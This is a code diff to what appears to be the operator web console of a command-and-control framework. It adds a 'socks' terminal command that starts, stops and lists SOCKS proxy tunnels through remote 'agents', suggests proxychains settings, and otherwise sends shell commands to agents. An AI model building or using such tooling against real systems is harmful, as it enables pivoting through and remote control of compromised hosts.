@@ -1947,6 +1947,38 @@ async function sendTermCmd() {
     args = raw; cmd = 'shell';
   }
 
+  // socks start/stop/list are handled via the tunnel API, not the task queue
+  if (cmd === 'socks') {
+    const sub = parts[1] ? parts[1].toLowerCase() : '';
+    if (sub === 'start') {
+      const port = parts[2] || '1080';
+      try {
+        const resp = await fetch('/api/tunnel/start', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent, bind:'127.0.0.1:'+port}) });
+        const data = await resp.json();
+        if (data.error) { termLog('error', '✗ ' + data.error); }
+        else { termLog('success', data.message); termLog('info', 'Configure proxychains: socks5 127.0.0.1 ' + port); }
+      } catch(e) { termLog('error', '✗ ' + e.message); }
+      return;
+    }
+    if (sub === 'stop') {
+      try {
+        const resp = await fetch('/api/tunnel/stop?agent=' + encodeURIComponent(agent));
+        const data = await resp.json();
+        if (data.error) { termLog('error', '✗ ' + data.error); }
+        else { termLog('success', '✓ SOCKS tunnel stopped'); }
+      } catch(e) { termLog('error', '✗ ' + e.message); }
+      return;
+    }
+    if (sub === 'list' || sub === '') {
+      try {
+        const tunnels = await fetchJ('/api/tunnel/list');
+        if (!tunnels || tunnels.length === 0) { termLog('info', 'No active SOCKS tunnels'); }
+        else { tunnels.forEach(t => termLog('output', '  ' + t.agent + ' → ' + t.bind + '  (' + t.connections + ' connections)')); }
+      } catch(e) { termLog('error', '✗ ' + e.message); }
+      return;
+    }
+  }
+
   try {
     const resp = await fetch('/api/cmd', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent,command:cmd,args}) });
     const data = await resp.json();
